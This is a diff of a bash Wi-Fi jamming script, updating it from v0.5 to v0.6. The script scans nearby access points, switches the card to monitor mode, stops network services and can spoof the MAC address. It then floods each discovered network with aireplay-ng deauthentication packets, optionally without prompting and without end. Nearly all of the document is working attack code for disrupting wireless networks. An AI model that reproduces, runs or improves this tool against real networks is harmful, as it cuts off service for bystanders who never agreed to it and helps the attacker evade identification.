@@ -9,19 +9,17 @@
 # SOFTWARE
 
 # Current Version
-version="v0.5"
+version="v0.6"
 
-# Variable and static names for Wireless interface
+# Default name for the Wireless interface
 wint="wlan0"
-wint_static="wlan0"
-
-# Variable and static names for Ethernet interface
-eint="eth0"
-eint_static="eth0"
-
+wint_set=0
 
 # base name for scan files
-name=jam_scan
+name=jam-scan
+
+# temp file name
+temp_name=$(mktemp "${name}-XXX")
 
 # default DeAuth times for each MAC address
 deauth_number=10
@@ -98,11 +96,9 @@ check_perm() {
     fi
 }
 
-
 # check if any of the required commands is missing
 check_dep() {
-    for command in airmon-ng macchanger iwlist awk
-    do
+    for command in airmon-ng macchanger iwlist awk; do
       if [[ -z $(which $command) ]]; then
         printlnpr "'$command' was not found"
         printlnpr "consider installing it from the repositories of your distribution"
@@ -133,36 +129,39 @@ whitelist_contains_element() {
 }
 
 # change the MAC of wireless interface
-change_macs() {
-    # Change mac address and initiate monitor mode
-    printlnp "Changing MAC for Wireless Interface"
-    ifconfig $wint down
-    sleep 1
-    macchanger -A $wint
-    sleep 1
-    ifconfig $wint up
+change_mac_inter() {
+    if [[ $change_macs -eq 1 ]]; then
+        # Change mac address and initiate monitor mode
+        printlnp "Changing MAC for Wireless Interface"
+        ifconfig $wint down
+        sleep 1
+        macchanger -A $wint
+        sleep 1
+        ifconfig $wint up
+    fi   
 }
 
 # reset the MACs and settings and remove files created
 cleanup_and_reset() {
+    airmon-ng stop ${wint}mon
     if [[ $change_macs -eq 1 ]]; then
-        printf "${prompt}Reseting the default MAC for Wireless Interface\n"
         ifconfig $wint down
         sleep 1
         macchanger -p $wint
-        sleep 1
-        iwconfig $wint mode Managed
         sleep 1
         ifconfig $wint up
     fi
     if [[ keep_scan_files -eq 0 ]]; then
         printf "${prompt}Cleaning up the created files . . .\n"
-        rm -f ${name}_out.txt
+        rm -f ${temp_name}
         rm -f $name-01.csv
         rm -f $name-01.cap
         rm -f $name-01.kismet.csv
         rm -f $name-01.kismet.netxml
     fi
+    ifconfig "$wint" up
+    service network-manager restart
+    service avahi-daemon restart
     printf "${prompt}Done. Exiting.\n"
 }
 
@@ -170,15 +169,26 @@ cleanup_and_reset() {
 warn_before() {
     printlnpg "DONE FINDING TARGETS"
     sleep 0.5
-    printlnpr "THE ATTACK WILL START IN 5 SECONDS$"
+    printlnpr "THE ATTACK WILL START IN 5 SECONDS"
     sleep 0.5
-    printlnpg "IF YOU WANT TO ABORT DO IT NOW$"
+    printlnpg "IF YOU WANT TO ABORT DO IT NOW"
     sleep 4.5
+}
+
+prepare_air() {
+    if [[ $(airmon-ng check | tail -n +6 | tr [:blank:] -) ]]; then
+        service network-manager stop
+        service avahi-daemon stop
+        # two times in succession seems to work well 
+        airmon-ng check kill > /dev/null 2>&1
+        airmon-ng check kill > /dev/null 2>&1
+    fi
+    airmon-ng start $wint
 }
 
 # if the default interface has not changed, warn the user
 warn_about_interface() {
-    if [[ "$wint" == "$wint_static" ]]; then
+    if [[ "$wint_set" -eq 0 ]]; then
         printlnpbr "the default interface has not been changed"
         printlnpbr "The detected interfaces are: "
         airmon-ng | sed '/^$/d' | awk '{print $2}' | tail -n +2
@@ -210,8 +220,6 @@ show_help() {
     printf "\t\t: Keep the scan files after the script ends\n"
     printgreen "-n, --name"
     printf "\t\t: Choose the names the scan files are saved as\n"
-    printgreen "-e, --ethernet"
-    printf "\t\t: Set the name for the ethernet interface. Default is 'eth0'\n"
     printgreen "-w, --wireless"
     printf "\t\t: Set the name for the wireless interface. Default is 'wlan0'\n"
     printgreen "--spoof-mac"
@@ -230,9 +238,9 @@ scan_area() {
             [[ "$line" =~ \(Channel ]] && { channel=${line##*nel }; channel=${channel:0:$((${#channel}-1))}; }
             [[ "$line" =~ ESSID ]] && {
                 essid=${line##*ID:}
-                [[ -z $(whitelist_contains_element "$essid") ]] && echo "${bssid};${channel};${essid}"
+                [[ $(whitelist_contains_element "$essid") ]] && echo "${bssid};${channel};${essid}"
             }
-        done > ${name}_out.txt ;
+        done > ${temp_name};
     then
         echo "Something went wrong, retrying"
         sleep 5
@@ -247,8 +255,8 @@ deauth() {
     if [[ "$channel" =~ $re ]]; then
         echo -e ${prompt}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
         sleep 3
-        iwconfig $wint channel "$channel"
-        aireplay-ng -0 $deauth_number -a "$bssid" $wint
+        iwconfig ${wint}mon channel "$channel"
+        aireplay-ng -0 $deauth_number -a "$bssid" ${wint}mon
     fi
 }
 
@@ -259,7 +267,7 @@ read_file_and_deauth() {
     do
         read bssid channel essid <<< $(echo $line | awk -F";" '{print $1 " " $2 " " $3}')
         deauth "$essid" "$bssid" "$channel"
-    done < ${name}_out.txt
+    done < ${temp_name}
 }
 
 # starts attack, if endless is 1, goes on forever
@@ -272,10 +280,10 @@ main_attack() {
 }
 
 
-# a fucntion to print the detected stations from the file
+# a function to print the detected stations from the file
 show_detected_stations() {
     printlnp "Detected Stations are:"
-    awk -F";" '{print NR,$3}' ${name}_out.txt
+    awk -F";" '{print NR,$3}' ${temp_name}
     printf "\n\n"
 }
 
@@ -317,13 +325,9 @@ parse_options() {
           printlnpg "Setting scan file names to $name"
           shift
       ;;
-      -e|--ethernet)
-          eint="$2"
-          printlnpg "Setting ethernet interface name to $eint"
-          shift
-      ;;
       -w|--wireless)
           wint="$2"
+          wint_set=1
           printlnpg "Setting wireless interface name to $wint"
           shift
       ;;
@@ -332,7 +336,9 @@ parse_options() {
           exit 0
       ;;
       *)
-          printlnpr "Unknown option '$1', exiting."
+          printlnpr "Unknown option '$1'"
+          show_help
+          printlnpr "Exiting."
           exit 0
       ;;
   esac
@@ -340,7 +346,6 @@ parse_options() {
   shift
   done
 }
-
 
 # print name and welcome message
 printintro
@@ -354,20 +359,21 @@ check_perm
 # check dependencies
 check_dep
 
-sleep 1
+# change directory to the place the script is executed from
+cd "$(dirname "$0")"
+
+# warn if the interface was not updated
+warn_about_interface
+
+# decide if the MAC will be changed
+change_mac_inter
 
 # trap to clean the files and reset at the end
 trap cleanup_and_reset EXIT
 
-# change directory to the place the script is executed from
-cd "$(dirname "$0")"
-
-# warn if the inteface was not updated
-warn_about_interface
-
-# show the station names you want to filter out
+# show the station names that are in the whitelist
 if [ ${#white_list[@]} -ne 0 ]; then
-    printlnp "Whitelisted stations: "
+    printlnp "White-listed stations: "
     echo "${white_list[@]}" | sed -e 's/^ *//' -e 's/ *$//'
 fi
 
@@ -376,10 +382,7 @@ printlnpg "Scanning the area for active stations"
 # execute scan and save the discovered MAC addresses and channels to a file
 scan_area
 
-if [[ $change_macs -eq 1 ]]; then
-  change_macs
-fi
-
+# show the stations the scan discovered
 show_detected_stations
 
 # check if the user wants no interaction
@@ -387,7 +390,6 @@ if [[ $yes_to_all -eq 1 ]]; then
     main_attack
     exit 0
 fi
-
 # else ask the user
 printf "${prompt}Scan is completed. Start jamming? [Y/n] "
 read answer_start
@@ -397,6 +399,7 @@ case $answer_start in
             exit 0
         ;;
         *)
+            prepare_air
             main_attack
             exit 0
         ;;
